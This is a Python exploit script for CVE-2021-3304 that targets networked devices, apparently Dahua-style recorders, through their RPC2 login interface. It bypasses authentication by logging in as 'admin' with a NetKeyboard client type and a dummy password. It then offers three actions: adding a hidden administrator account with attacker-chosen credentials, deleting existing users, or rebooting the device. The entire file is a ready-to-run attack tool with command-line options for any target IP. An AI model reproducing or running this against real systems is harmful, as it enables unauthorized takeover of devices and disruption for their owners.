import requests
import json
from requests.packages import urllib3
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="The target ip", required=True)
parser.add_argument("--port", help="The target port", default="80")
parser.add_argument("--protocol", help="http/https", default="http")
parser.add_argument("--action", help="addAdmin,userRemove,reboot", default="")
parser.add_argument("--loginAdd", help="if use addAdmin need login", default="admin1")
parser.add_argument("--passAdd", help="if use addAdmin need password", default="admin12345")
parser.add_argument("--commentAdd", help="if use addAdmin you may add comment", default="")
parser.add_argument("--loginDelete", help="if use userRemove need login to remove", default="")

args = parser.parse_args()
if args.protocol != "http" and args.protocol != "https":
	print("Bad protocol!\nusage --protocol <http/https>")
	exit()

def filter_result(data):
	return json.loads(str(data).replace('\\n','').replace("b'","").replace("'",""))
	
def rndKey():
	from random import randint
	s = ''
	for i in range(16):
		s = s + str(randint(0, 9))
	return s
	
i=0
def reqCnt():
	global i
	i=i+1
	return i

if args.ip and args.port:
	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
	target = args.ip+":"+args.port
	url = args.protocol+"://"+target+"/RPC2_Login"
	headerss = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": target+"/", "Referer": target+"/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
	post_json={"id": i, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}
	sess = requests.Session()
	sess.get(args.protocol+"://"+target, headers=headerss)
	r = sess.post(url, headers=headerss, json=post_json, verify=False)
	req=filter_result(r.content)
	if 'true' in str(r.content):
		print('Vulnerable with CVE-2021-3304')
		if args.action:
			url = args.protocol + "://" + target + "/RPC2"
			if args.action=='addAdmin':
				if args.loginAdd and args.passAdd:
					import hashlib, base64
					from Crypto.Util.Padding import pad
					from Crypto.Cipher import AES
					from rsakey import RSAKey
					post_json={"method": "Security.getEncryptInfo", "params": None, "id": reqCnt(), "session": req['session']}
					r = sess.post(url, headers=headerss, json=post_json, verify=False)
					enc=filter_result(r.content)
					post_json={"method":"configManager.getConfig","params":{"name":"General"},"id":reqCnt(),"session": req['session']}
					r = sess.post(url, headers=headerss, json=post_json, verify=False)
					genInfo=filter_result(r.content)
					post_json = {"method": "userManager.getGroupInfoAll", "params": None, "id": reqCnt(), "session": req['session']}
					r = sess.post(url, headers=headerss, json=post_json, verify=False)
					groups=filter_result(r.content)
					rsakey = RSAKey()
					pubkey=enc['params']['pub'].split(',')[0].split(":")[1]
					pubekey = enc['params']['pub'].split(',')[1].split(":")[1]
					rsakey.setPublic(pubkey, pubekey)
					masKey=rndKey()
					retKey = rsakey.encrypt(masKey)
					encrypt = AES.new(masKey.encode(), AES.MODE_ECB)
					j = {}
					j['Id'] = i+1
					j['Name'] = args.loginAdd
					passwd=args.loginAdd+':Login to '+str(genInfo['params']['table']['MachineName'])+':'+args.passAdd
					hash_object = hashlib.md5(passwd.encode())
					j['Password'] = hash_object.hexdigest().upper()
					j['Type'] = ''
					j['ModifiedTime'] = ''
					j['Memo'] = args.commentAdd
					j['Group'] = 'admin'
					j['AuthorityList'] = groups['params'][0]['AuthorityList']
					j['Reserved'] = False
					j['Sharable'] = True
					data=json.dumps({'user':j})
					dtenc=encrypt.encrypt(pad(data.encode(),16))
					encrypted_text = str(base64.b64encode(dtenc), encoding='utf-8')
					post_json={"method": "Security.addUser", "params": {
						"salt": retKey,
						"cipher": "AES-128",
						"content": encrypted_text},
					 "id":reqCnt(), "session": req['session']}
					r = sess.post(url, headers=headerss, json=post_json, verify=False)
					if 'true' in str(r.content):
						print('Success add administrator login: '+str(args.loginAdd)+' password: '+str(args.passAdd))
					else:
						addInfo=filter_result(r.content)
						print('Error on add new user')
						if addInfo['error']['code']==605:
							print('User '+str(args.loginAdd)+' already exists!')
				else:
					print('Need login and password for add new Administrator (use args --loginAdd and --passAdd)')
			elif args.action=='userRemove':
				if args.loginDelete:
					post_json={"method":"userManager.deleteUser","params":{"name":args.loginDelete},"id":reqCnt(),"session":req['session']}
					r = sess.post(url, headers=headerss, json=post_json, verify=False)
					if 'true' in str(r.content):
						print('Success remove user')
					else:
						delInfo=filter_result(r.content)
						print('Error on remove user')
						if delInfo['error']['code']==608:
							print('User already logined!')
						if delInfo['error']['code']==607:
							print('User not found!')
				else:
					print('Need login to delete user (use arg --loginDelete)')
			elif args.action=='reboot':
				i = i+1
				post_json={"method": "magicBox.reboot", "params": None, "id": reqCnt(), "session": req['session']}
				r = sess.post(url, headers=headerss, json=post_json, verify=False)
				if 'true' in str(r.content):
					print('Success reboot')
				else:
					print('Error on reboot')
	else:
		print ("Not Vulnerable with CVE-2021-3304!")
